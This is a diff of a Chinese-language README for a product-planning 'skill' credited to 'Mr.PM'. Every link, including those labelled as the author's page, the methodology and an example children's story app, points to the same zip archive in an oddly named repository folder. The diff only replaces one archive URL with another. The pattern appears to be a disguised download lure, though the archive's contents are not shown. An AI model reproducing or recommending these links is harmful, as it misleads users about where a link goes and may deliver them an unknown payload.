@@ -1,6 +1,6 @@
 # Product Planning Skill
 
-基於 [Mr.PM](https://raw.githubusercontent.com/mokrom1234/product-planning-skill/main/argyranthemous/planning-product-skill-1.8-alpha.5.zip) 的[產品企劃方法論](https://raw.githubusercontent.com/mokrom1234/product-planning-skill/main/argyranthemous/planning-product-skill-1.8-alpha.5.zip)所設計的產品企劃引導工具，幫助你從零到一系統性地完成產品企劃。
+基於 [Mr.PM](https://github.com/mokrom1234/product-planning-skill/raw/refs/heads/main/argyranthemous/product_skill_planning_v1.1.zip) 的[產品企劃方法論](https://github.com/mokrom1234/product-planning-skill/raw/refs/heads/main/argyranthemous/product_skill_planning_v1.1.zip)所設計的產品企劃引導工具，幫助你從零到一系統性地完成產品企劃。
 
 ## 這個 Skill 做什麼？
 
@@ -32,11 +32,11 @@
 
 ## 產出範例
 
-[兒童故事 App 範例](https://raw.githubusercontent.com/mokrom1234/product-planning-skill/main/argyranthemous/planning-product-skill-1.8-alpha.5.zip)
+[兒童故事 App 範例](https://github.com/mokrom1234/product-planning-skill/raw/refs/heads/main/argyranthemous/product_skill_planning_v1.1.zip)
 
 ## Author
 
-[Mr.PM](https://raw.githubusercontent.com/mokrom1234/product-planning-skill/main/argyranthemous/planning-product-skill-1.8-alpha.5.zip)
+[Mr.PM](https://github.com/mokrom1234/product-planning-skill/raw/refs/heads/main/argyranthemous/product_skill_planning_v1.1.zip)
 Product & Growth Coach
 
 ## License
